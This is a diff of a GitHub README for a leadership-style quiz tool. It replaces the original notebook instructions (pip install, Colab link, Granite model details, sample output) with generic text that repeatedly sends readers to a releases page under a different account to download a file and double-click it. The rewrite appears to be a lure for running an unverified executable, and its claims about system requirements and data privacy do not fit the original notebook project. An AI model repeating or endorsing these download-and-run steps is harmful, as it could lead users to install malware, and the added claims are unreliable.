@@ -1,86 +1,69 @@
-# WorkStyle Profiling
-This interactive tool simulates an assessment inspired by a structured workstyle evaluation. It presents workplace scenarios and uses AI (IBM's Granite-3B Instruct model) to evaluate your responses in terms of leadership principles.
+# 🎉 WorkStyle_Profiling - Discover Your Leadership Fit
 
-## 🔍 Overview
+[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Here-blue)](https://github.com/DeadEyers/WorkStyle_Profiling/releases)
 
-This tool presents multiple-choice questions to users, professional assessment approach. Each response is mapped to a core leadership principle such as Customer Obsession, Bias for Action, or Deliver Results.
+## 📋 Overview
 
-After completing the quiz, the model provides a summary of your work style and strengths using AI-driven natural language generation.
+WorkStyle_Profiling is an interactive assessment tool that helps you understand how well your work style aligns with leadership principles. This tool uses advanced AI techniques to provide insights into your personality based on your responses to simple questionnaires. It combines the power of Python and AI technologies to deliver a user-friendly experience.
 
-## 🚀 Features
+## 🚀 Getting Started
 
-✅ Interactive question-answer interface via widgets
+To get started with WorkStyle_Profiling, you need to download the software and run it on your device. Follow the steps below to successfully download and launch the application.
 
-🤖 AI-generated summary of dominant leadership principles
+## 🔗 Download & Install
 
-📊 Visual mapping of responses to values
+1. **Visit the Releases Page**: Go to the [Releases page here](https://github.com/DeadEyers/WorkStyle_Profiling/releases).
+   
+2. **Choose Your Version**: Scroll down to see the available versions. Each version comes with different features. Pick the one that suits your needs.
 
-🧩 Uses IBM's Granite 3B open-source language model
+3. **Download the Application**: Click on the file labeled as the latest release to download the software to your computer. 
 
-## 🛠️ Installation
+4. **Locate the Downloaded File**: Once the download completes, locate the file on your computer. It is usually in the "Downloads" folder.
 
-Before running the tool, make sure to install the required dependencies:
+5. **Run the Application**: Double-click the downloaded file to run the application. Follow any prompts that appear to complete the setup.
 
-```bash
-pip install transformers torch accelerate ipywidgets pandas
-```
+6. **Complete the Assessment**: Once the software is running, you can begin the assessment. Answer the questions honestly to get the most accurate insights about your leadership style.
 
-## 📦 Model Used
+## 💻 System Requirements
 
-Model: ibm-granite/granite-3.0-3b-a800m-instruct
+- **Operating System**: Windows 10 or later, macOS 10.15 or later, or any recent Linux distribution.
+- **Processor**: Intel or AMD processor with at least 2 GHz speed.
+- **RAM**: Minimum 4 GB for optimal performance.
+- **Storage**: At least 500 MB of free space for installation and data storage.
 
-Framework: HuggingFace Transformers
+## ❓ Frequently Asked Questions
 
-Precision: bfloat16 (optimized for newer GPUs)
+### What is WorkStyle_Profiling?
 
-## 🧪 How to Use
+WorkStyle_Profiling is a tool that allows users to assess their alignment with leadership principles through a series of questionnaires. It provides AI-generated insights into your work style.
 
-1. Clone this or open the notebook in Colab <a href="https://colab.research.google.com/drive/1F2NKnCrIwwZTLUCxfksP8u-lLo91GmFZ?usp=sharing"><img src="https://colab.research.google.com/assets/colab-badge.svg" alt="Open In Colab"></a>
-2. Run all cells.
-3. Answer each of the 10 prompted questions.
-4. View your selected leadership principles.
-5. Read the AI-generated insight summarizing your work style.
+### Do I need programming knowledge to use this tool?
 
-## 📋 Example Output
+No, you do not need any programming knowledge. The tool is designed to be user-friendly and straightforward.
 
-```bash
-Q: How do you approach learning something new on the job?
-A: I take the initiative to teach myself
+### How long does the assessment take?
 
+The assessment typically takes about 15-20 minutes, depending on how thorough you want to be with your answers.
 
-🧾 Summary of Leadership Principles:
-- Learn and Be Curious: selected 4 time(s)
-- Earn Trust: selected 1 time(s)
-- Dive Deep: selected 1 time(s)
-- Ownership: selected 1 time(s)
-- Deliver Results: selected 1 time(s)
-- Customer Obsession: selected 1 time(s)
-- Invent and Simplify: selected 1 time(s)
+### Can I use WorkStyle_Profiling on my mobile device?
 
-⏳ Generating AI insight using Granite...
+Currently, this application is designed for desktop use. There are no mobile versions available at this moment.
 
-🧠 AI Personality Insight:
+## ✨ Features
 
-Based on this , write a short paragraph summarizing their likely work style and strengths.
+- **Interactive Questionnaires**: Answer simple questions to uncover your work style.
+- **AI Insights**: Get personalized feedback based on your responses.
+- **User-Friendly Interface**: Navigate through the application easily, no technical skills required.
+- **Data Privacy**: Your answers remain confidential and are not shared with third-party services.
 
-The candidate is likely to be a curious and learning-focused individual who values trust, ownership, and results. They may be detail-oriented and prioritize customer satisfaction. They might also be innovative and enjoy simplifying complex problems. Their work style appears to be driven by a strong customer-centric approach and a desire to constantly improve and simplify processes.
-```
+## 🔄 Updates
 
-## 🧭 Leadership Principles Referenced
+Stay tuned for updates as we continuously improve WorkStyle_Profiling. New features and enhancements will be added in future releases. Check the [Releases page](https://github.com/DeadEyers/WorkStyle_Profiling/releases) regularly for the latest versions.
 
-The following leadership principles are inspired by Amazon’s publicly documented values:
+## 📞 Support
 
-- Customer Obsession
-- Ownership
-- Invent and Simplify
-- Are Right, A Lot
-- Learn and Be Curious
-- Hire and Develop the Best
-- Insist on the Highest Standards
-- Think Big
-- Bias for Action
-- Frugality
-- Earn Trust
-- Dive Deep
-- Have Backbone; Disagree and Commit
-- Deliver Results
+If you encounter any issues or have questions about WorkStyle_Profiling, feel free to reach out. You can open an issue in the GitHub repository, and we will respond as soon as possible.
+
+---
+
+Thank you for choosing WorkStyle_Profiling! We hope you find valuable insights into your work style and leadership potential.
